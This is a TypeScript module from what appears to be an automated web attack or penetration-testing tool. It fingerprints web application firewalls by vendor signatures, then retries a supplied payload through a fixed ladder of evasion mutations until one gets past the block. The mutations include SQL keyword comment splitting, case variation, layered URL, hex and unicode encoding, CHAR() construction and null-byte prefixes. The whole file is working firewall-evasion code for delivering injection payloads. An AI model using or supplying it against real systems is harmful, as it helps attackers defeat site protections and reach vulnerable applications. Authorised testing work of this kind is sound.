import { fetchUrl } from "../adapters/http.js";
import { writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";

/** WAF-adaptive payload delivery: fires a payload, detects WAF interception
 *  (403+block-page signatures, 406, 429, connection resets via status 0),
 *  and retries with deterministic mutation ladders — case randomization,
 *  inline/comment/case-alteration obfuscation, URL/hex/unicode encoding,
 *  whitespace junk, char-code construction. Each mutation is a NEW request;
 *  verdicts are differential (payload got a NON-WAF response = delivered).
 *
 *  This is the transport layer for oob_confirm / template-matcher payloads when a
 *  naive fire gets eaten by a WAF. Zero LLM, deterministic ladders. */

export interface WafAdaptInput {
  readonly url: string;
  readonly payload: string;
  readonly outputRoot: string;
  /** where the payload goes */
  readonly param?: string;
  readonly in?: "query" | "body" | "header" | "path";
  readonly method?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** max mutation attempts (default 8) */
  readonly maxAttempts?: number;
}

export interface WafAdaptResult {
  readonly attempts: { mutation: string; url: string; status: number; wafSignature: string | null; delivered: boolean }[];
  /** null = never delivered past the WAF */
  readonly deliveredBy: string | null;
  readonly wafFingerprint: { name: string; evidence: string } | null;
  readonly artifacts: { path: string; bytes: number }[];
}

/** WAF block signatures: (server header, body marker) pairs. */
const WAF_SIGS: { name: string; header: RegExp; body?: RegExp }[] = [
  { name: "cloudflare", header: /cloudflare/i, body: /attention required|cf-ray|cloudflare/i },
  { name: "aws-waf", header: /awswaf|x-amzn-requestid/i, body: /request blocked|aws waf/i },
  { name: "akamai", header: /akamai/i, body: /access denied|akamai/i },
  { name: "imperva", header: /imperva|incapsula/i, body: /incapsula|imperva/i },
  { name: "f5-bigip", header: /bigip|f5/i, body: /the requested url was rejected/i },
  { name: "sucuri", header: /sucuri/i, body: /sucuri/i },
  { name: "modsecurity", header: /mod_security/i, body: /mod_security|not acceptable/i },
  { name: "generic-block", header: /.*/, body: /request blocked|security rule|firewall|intercepted|forbidden request/i },
];

const wafSignature = (status: number, headers: Record<string, string>, body: string): { name: string; evidence: string } | null => {
  if (status !== 403 && status !== 406 && status !== 429 && status !== 400 && status !== 501) return null;
  const headerStr = Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join("\n");
  for (const w of WAF_SIGS) {
    if (w.header.test(headerStr) && (!w.body || w.body.test(body))) {
      return { name: w.name, evidence: `status ${status} + ${w.name} markers` };
    }
  }
  // status-based fallback: 403/406 on a payload that a normal server would
  // answer with anything else
  if (status === 403 || status === 406) return { name: "unknown-waf", evidence: `status ${status} without app-level signature` };
  return null;
};

// ---------------- mutation ladder (deterministic, ordered) ----------------

const rand = (seed: { v: number }): number => {
  seed.v = (seed.v * 1103515245 + 12345) & 0x7fffffff;
  return seed.v / 0x7fffffff;
};

const caseVary = (p: string, seed: { v: number }): string => [...p].map((c) => (rand(seed) < 0.5 ? c.toLowerCase() : c.toUpperCase())).join("");

const mutations: { name: string; make: (p: string, seed: { v: number }) => string }[] = [
  { name: "case-vary", make: (p, s) => caseVary(p, s) },
  { name: "inline-comment", make: (p) => p.replace(/(SELECT|UNION|FROM|WHERE|AND|OR)/i, (m) => `${m.slice(0, 1)}/**/${m.slice(1)}`) },
  { name: "comment-split", make: (p) => p.replace(/(SELECT|UNION|FROM|WHERE)/i, (m) => `${m.slice(0, 2)}/*x*/${m.slice(2)}`) },
  { name: "url-encode", make: (p) => encodeURIComponent(p) },
  { name: "double-url-encode", make: (p) => encodeURIComponent(encodeURIComponent(p)) },
  { name: "hex-encode", make: (p) => [...p].map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, "0")}`).join("") },
  { name: "unicode-escape", make: (p) => [...p].map((c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`).join("") },
  { name: "charcode-concat", make: (p) => [...p.slice(0, 24)].map((c) => `CHAR(${c.charCodeAt(0)})`).join(",") },
  { name: "whitespace-junk", make: (p) => p.replace(/\s+/g, "%09%0a ") },
  { name: "null-byte-prefix", make: (p) => `%00${p}` },
];

export const probeWafAdapt = async (input: WafAdaptInput): Promise<WafAdaptResult> => {
  await mkdir(input.outputRoot, { recursive: true });
  const opts = { proxy: input.proxy, timeoutMs: input.timeoutMs ?? 8000, headers: input.headers };
  const method = input.method ?? "GET";
  const in_ = input.in ?? "query";
  const param = input.param ?? "q";
  const seed = { v: 0x9e3779b9 };

  const fire = (payload: string): { url: string; body?: string; headers: Record<string, string> } => {
    const headers = { ...input.headers };
    let url = input.url;
    let body: string | undefined;
    if (in_ === "query") {
      const u = new URL(input.url);
      u.searchParams.set(param, payload);
      url = u.toString();
    } else if (in_ === "body") {
      body = JSON.stringify({ [param]: payload });
      headers["content-type"] = headers["content-type"] ?? "application/json";
    } else if (in_ === "header") {
      headers[param] = payload;
    } else {
      url = input.url.replace(/\/([^/?]*)$/, `/${encodeURIComponent(payload)}`);
    }
    return { url, body, headers };
  };

  const attempts: WafAdaptResult["attempts"] = [];
  let wafFingerprint: { name: string; evidence: string } | null = null;
  let deliveredBy: string | null = null;

  // Attempt 0: raw payload.
  {
    const t = fire(input.payload);
    const r = await fetchUrl(t.url, { ...opts, method, body: t.body, headers: t.headers });
    const sig = wafSignature(r.status, r.headers ?? {}, r.body.slice(0, 2048));
    const delivered = r.status > 0 && sig === null;
    attempts.push({ mutation: "raw", url: t.url, status: r.status, wafSignature: sig?.name ?? null, delivered });
    if (sig) wafFingerprint = sig;
    if (delivered) deliveredBy = "raw";
  }

  // Mutation ladder until delivered.
  const max = input.maxAttempts ?? 8;
  if (deliveredBy === null) {
    for (const m of mutations.slice(0, max)) {
      const variant = m.make(input.payload, seed);
      const t = fire(variant);
      const r = await fetchUrl(t.url, { ...opts, method, body: t.body, headers: t.headers });
      const sig = wafSignature(r.status, r.headers ?? {}, r.body.slice(0, 2048));
      const delivered = r.status > 0 && sig === null;
      attempts.push({ mutation: m.name, url: t.url, status: r.status, wafSignature: sig?.name ?? null, delivered });
      if (sig && !wafFingerprint) wafFingerprint = sig;
      if (delivered) { deliveredBy = m.name; break; }
    }
  }

  const bodyStr = JSON.stringify({ attempts, deliveredBy, wafFingerprint }, null, 2);
  const path = join(input.outputRoot, "waf_adapt.json");
  await writeFile(path, bodyStr, "utf8");
  return { attempts, deliveredBy, wafFingerprint, artifacts: [{ path, bytes: Buffer.byteLength(bodyStr) }] };
};
